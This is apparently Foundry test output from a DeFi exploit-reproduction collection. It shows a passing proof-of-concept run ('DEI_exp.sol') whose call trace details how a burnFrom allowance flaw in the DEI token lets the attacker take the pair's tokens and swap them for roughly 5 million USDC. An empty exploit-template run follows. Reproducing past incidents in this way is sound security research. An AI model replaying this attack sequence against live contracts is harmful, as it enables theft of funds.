Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.15s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
  --> src/test/2023-05/DEI_exp.sol:25:5:
   |
25 |     IERC20 USDC = IERC20(0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8);
   |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
    --> src/test/interface.sol:2629:1:
     |
2629 | interface USDC {
     | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for src/test/2023-05/DEI_exp.sol:DEIPocTest
[PASS] testExploit() (gas: 354671)
Logs:
  DEI balance:  0
  DEI balance from attacker:  4602837090538811392635119
  USDC balance after:  5047470472572

Traces:
  [382971] DEIPocTest::testExploit()
    ├─ [9912] 0xDE1E704dae0B4051e80DAbB26ab6ad6c12262DA0::balanceOf(DEIPocTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [2581] 0xBC1b62dB243B51dabCd9540473324f36E094EC55::balanceOf(DEIPocTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Return] 0
    ├─ [0] console::log("DEI balance: ", 0) [staticcall]
    │   └─ ← [Stop] 
    ├─ [27540] 0xDE1E704dae0B4051e80DAbB26ab6ad6c12262DA0::approve(0x7DC406b9B904a52D10E19E848521BbA2dE74888b, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   ├─ [26706] 0xBC1b62dB243B51dabCd9540473324f36E094EC55::approve(0x7DC406b9B904a52D10E19E848521BbA2dE74888b, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
    │   │   ├─ emit Approval(owner: DEIPocTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: 0x7DC406b9B904a52D10E19E848521BbA2dE74888b, value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   └─ ← [Return] true
    │   └─ ← [Return] true
    ├─ [32254] 0xDE1E704dae0B4051e80DAbB26ab6ad6c12262DA0::burnFrom(0x7DC406b9B904a52D10E19E848521BbA2dE74888b, 0)
    │   ├─ [31423] 0xBC1b62dB243B51dabCd9540473324f36E094EC55::burnFrom(0x7DC406b9B904a52D10E19E848521BbA2dE74888b, 0) [delegatecall]
    │   │   ├─ emit Approval(owner: 0x7DC406b9B904a52D10E19E848521BbA2dE74888b, spender: DEIPocTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   ├─ emit Transfer(from: 0x7DC406b9B904a52D10E19E848521BbA2dE74888b, to: 0x0000000000000000000000000000000000000000, value: 0)
    │   │   └─ ← [Stop] 
    │   └─ ← [Return] 
    ├─ [1412] 0xDE1E704dae0B4051e80DAbB26ab6ad6c12262DA0::balanceOf(0x7DC406b9B904a52D10E19E848521BbA2dE74888b) [staticcall]
    │   ├─ [581] 0xBC1b62dB243B51dabCd9540473324f36E094EC55::balanceOf(0x7DC406b9B904a52D10E19E848521BbA2dE74888b) [delegatecall]
    │   │   └─ ← [Return] 4602837090538811392635120 [4.602e24]
    │   └─ ← [Return] 4602837090538811392635120 [4.602e24]
    ├─ [29455] 0xDE1E704dae0B4051e80DAbB26ab6ad6c12262DA0::transferFrom(0x7DC406b9B904a52D10E19E848521BbA2dE74888b, DEIPocTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4602837090538811392635119 [4.602e24])
    │   ├─ [28615] 0xBC1b62dB243B51dabCd9540473324f36E094EC55::transferFrom(0x7DC406b9B904a52D10E19E848521BbA2dE74888b, DEIPocTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 4602837090538811392635119 [4.602e24]) [delegatecall]
    │   │   ├─ emit Transfer(from: 0x7DC406b9B904a52D10E19E848521BbA2dE74888b, to: DEIPocTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 4602837090538811392635119 [4.602e24])
    │   │   ├─ emit Approval(owner: 0x7DC406b9B904a52D10E19E848521BbA2dE74888b, spender: DEIPocTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 115792089237316195423570985008687907853269984665640559436620493469101737004816 [1.157e77])
    │   │   └─ ← [Return] true
    │   └─ ← [Return] true
    ├─ [1412] 0xDE1E704dae0B4051e80DAbB26ab6ad6c12262DA0::balanceOf(DEIPocTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [581] 0xBC1b62dB243B51dabCd9540473324f36E094EC55::balanceOf(DEIPocTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 4602837090538811392635119 [4.602e24]
    │   └─ ← [Return] 4602837090538811392635119 [4.602e24]
    ├─ [0] console::log("DEI balance from attacker: ", 4602837090538811392635119 [4.602e24]) [staticcall]
    │   └─ ← [Stop] 
    ├─ [123662] 0x7DC406b9B904a52D10E19E848521BbA2dE74888b::sync()
    │   ├─ [1412] 0xDE1E704dae0B4051e80DAbB26ab6ad6c12262DA0::balanceOf(0x7DC406b9B904a52D10E19E848521BbA2dE74888b) [staticcall]
    │   │   ├─ [581] 0xBC1b62dB243B51dabCd9540473324f36E094EC55::balanceOf(0x7DC406b9B904a52D10E19E848521BbA2dE74888b) [delegatecall]
    │   │   │   └─ ← [Return] 1
    │   │   └─ ← [Return] 1
    │   ├─ [9796] 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8::balanceOf(0x7DC406b9B904a52D10E19E848521BbA2dE74888b) [staticcall]
    │   │   ├─ [2553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(0x7DC406b9B904a52D10E19E848521BbA2dE74888b) [delegatecall]
    │   │   │   └─ ← [Return] 5047470472573 [5.047e12]
    │   │   └─ ← [Return] 5047470472573 [5.047e12]
    │   ├─ emit Sync(: 1, : 5047470472573 [5.047e12])
    │   └─ ← [Stop] 
    ├─ [1412] 0xDE1E704dae0B4051e80DAbB26ab6ad6c12262DA0::balanceOf(DEIPocTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [581] 0xBC1b62dB243B51dabCd9540473324f36E094EC55::balanceOf(DEIPocTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 4602837090538811392635119 [4.602e24]
    │   └─ ← [Return] 4602837090538811392635119 [4.602e24]
    ├─ [4152] 0xDE1E704dae0B4051e80DAbB26ab6ad6c12262DA0::transfer(0x7DC406b9B904a52D10E19E848521BbA2dE74888b, 4602837090538811392635119 [4.602e24])
    │   ├─ [3318] 0xBC1b62dB243B51dabCd9540473324f36E094EC55::transfer(0x7DC406b9B904a52D10E19E848521BbA2dE74888b, 4602837090538811392635119 [4.602e24]) [delegatecall]
    │   │   ├─ emit Transfer(from: DEIPocTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: 0x7DC406b9B904a52D10E19E848521BbA2dE74888b, value: 4602837090538811392635119 [4.602e24])
    │   │   └─ ← [Return] true
    │   └─ ← [Return] true
    ├─ [128704] 0x7DC406b9B904a52D10E19E848521BbA2dE74888b::swap(0, 5047470472572 [5.047e12], DEIPocTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0x)
    │   ├─ [10066] 0xCe9240869391928253Ed9cc9Bcb8cb98CB5B0722::isPaused() [staticcall]
    │   │   ├─ [2750] 0x7C7b7dE557282411358575f3322e321c94245A9F::isPaused() [delegatecall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    │   ├─ [35397] 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8::transfer(DEIPocTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5047470472572 [5.047e12])
    │   │   ├─ [34651] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::transfer(DEIPocTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5047470472572 [5.047e12]) [delegatecall]
    │   │   │   ├─ emit Transfer(from: 0x7DC406b9B904a52D10E19E848521BbA2dE74888b, to: DEIPocTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 5047470472572 [5.047e12])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ [1412] 0xDE1E704dae0B4051e80DAbB26ab6ad6c12262DA0::balanceOf(0x7DC406b9B904a52D10E19E848521BbA2dE74888b) [staticcall]
    │   │   ├─ [581] 0xBC1b62dB243B51dabCd9540473324f36E094EC55::balanceOf(0x7DC406b9B904a52D10E19E848521BbA2dE74888b) [delegatecall]
    │   │   │   └─ ← [Return] 4602837090538811392635120 [4.602e24]
    │   │   └─ ← [Return] 4602837090538811392635120 [4.602e24]
    │   ├─ [1296] 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8::balanceOf(0x7DC406b9B904a52D10E19E848521BbA2dE74888b) [staticcall]
    │   │   ├─ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(0x7DC406b9B904a52D10E19E848521BbA2dE74888b) [delegatecall]
    │   │   │   └─ ← [Return] 1
    │   │   └─ ← [Return] 1
    │   ├─ [3454] 0xCe9240869391928253Ed9cc9Bcb8cb98CB5B0722::getFee(true) [staticcall]
    │   │   ├─ [2635] 0x7C7b7dE557282411358575f3322e321c94245A9F::getFee(true) [delegatecall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000004
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000004
    │   ├─ [3428] 0xCe9240869391928253Ed9cc9Bcb8cb98CB5B0722::dibs() [staticcall]
    │   │   ├─ [2612] 0x7C7b7dE557282411358575f3322e321c94245A9F::dibs() [delegatecall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000006cb66a0762e7ce3c0abc9d0241bf4cffc67fcda1
    │   │   └─ ← [Return] 0x0000000000000000000000006cb66a0762e7ce3c0abc9d0241bf4cffc67fcda1
    │   ├─ [3133] 0xCe9240869391928253Ed9cc9Bcb8cb98CB5B0722::MAX_REFERRAL_FEE() [staticcall]
    │   │   ├─ [2317] 0x7C7b7dE557282411358575f3322e321c94245A9F::MAX_REFERRAL_FEE() [delegatecall]
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000004b0
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000004b0
    │   ├─ [11752] 0xDE1E704dae0B4051e80DAbB26ab6ad6c12262DA0::transfer(0x6cB66a0762E7Ce3c0Abc9d0241bF4cfFc67fcdA1, 220936180345862946846 [2.209e20])
    │   │   ├─ [10918] 0xBC1b62dB243B51dabCd9540473324f36E094EC55::transfer(0x6cB66a0762E7Ce3c0Abc9d0241bF4cfFc67fcdA1, 220936180345862946846 [2.209e20]) [delegatecall]
    │   │   │   ├─ emit Transfer(from: 0x7DC406b9B904a52D10E19E848521BbA2dE74888b, to: 0x6cB66a0762E7Ce3c0Abc9d0241bF4cfFc67fcdA1, value: 220936180345862946846 [2.209e20])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ [3507] 0xCe9240869391928253Ed9cc9Bcb8cb98CB5B0722::stakingNFTFee() [staticcall]
    │   │   ├─ [2691] 0x7C7b7dE557282411358575f3322e321c94245A9F::stakingNFTFee() [delegatecall]
    │   │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000007d0
    │   │   └─ ← [Return] 0x00000000000000000000000000000000000000000000000000000000000007d0
    │   ├─ [5603] 0xD2193BFfE8F9c5a788dBaE189c3C3eFf53A32200::processStakingFees(324039731173932322041 [3.24e20], true)
    │   │   └─ ← [Stop] 
    │   ├─ [8952] 0xDE1E704dae0B4051e80DAbB26ab6ad6c12262DA0::transfer(0xD2193BFfE8F9c5a788dBaE189c3C3eFf53A32200, 1620198655869661610208 [1.62e21])
    │   │   ├─ [8118] 0xBC1b62dB243B51dabCd9540473324f36E094EC55::transfer(0xD2193BFfE8F9c5a788dBaE189c3C3eFf53A32200, 1620198655869661610208 [1.62e21]) [delegatecall]
    │   │   │   ├─ emit Transfer(from: 0x7DC406b9B904a52D10E19E848521BbA2dE74888b, to: 0xD2193BFfE8F9c5a788dBaE189c3C3eFf53A32200, value: 1620198655869661610208 [1.62e21])
    │   │   │   └─ ← [Return] true
    │   │   └─ ← [Return] true
    │   ├─ emit Fees(param0: DEIPocTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], param1: 1841134836215524557054 [1.841e21], param2: 0)
    │   ├─ [1412] 0xDE1E704dae0B4051e80DAbB26ab6ad6c12262DA0::balanceOf(0x7DC406b9B904a52D10E19E848521BbA2dE74888b) [staticcall]
    │   │   ├─ [581] 0xBC1b62dB243B51dabCd9540473324f36E094EC55::balanceOf(0x7DC406b9B904a52D10E19E848521BbA2dE74888b) [delegatecall]
    │   │   │   └─ ← [Return] 4600995955702595868078066 [4.6e24]
    │   │   └─ ← [Return] 4600995955702595868078066 [4.6e24]
    │   ├─ [1296] 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8::balanceOf(0x7DC406b9B904a52D10E19E848521BbA2dE74888b) [staticcall]
    │   │   ├─ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(0x7DC406b9B904a52D10E19E848521BbA2dE74888b) [delegatecall]
    │   │   │   └─ ← [Return] 1
    │   │   └─ ← [Return] 1
    │   ├─ emit Sync(: 4600995955702595868078066 [4.6e24], : 1)
    │   ├─ emit Swap(sender: DEIPocTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], amount0In: 4602837090538811392635119 [4.602e24], amount1In: 0, amount0Out: 0, amount1Out: 5047470472572 [5.047e12], to: DEIPocTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496])
    │   └─ ← [Stop] 
    ├─ [1296] 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8::balanceOf(DEIPocTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    │   ├─ [553] 0x1eFB3f88Bc88f03FD1804A5C53b7141bbEf5dED8::balanceOf(DEIPocTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    │   │   └─ ← [Return] 5047470472572 [5.047e12]
    │   └─ ← [Return] 5047470472572 [5.047e12]
    ├─ [0] console::log("USDC balance after: ", 5047470472572 [5.047e12]) [staticcall]
    │   └─ ← [Stop] 
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 289.38ms (4.73ms CPU time)

Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    ├─ [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    │   └─ ← [Return] 
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    ├─ emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    └─ ← [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 298.39ms (143.80µs CPU time)

Ran 2 test suites in 299.89ms (587.77ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
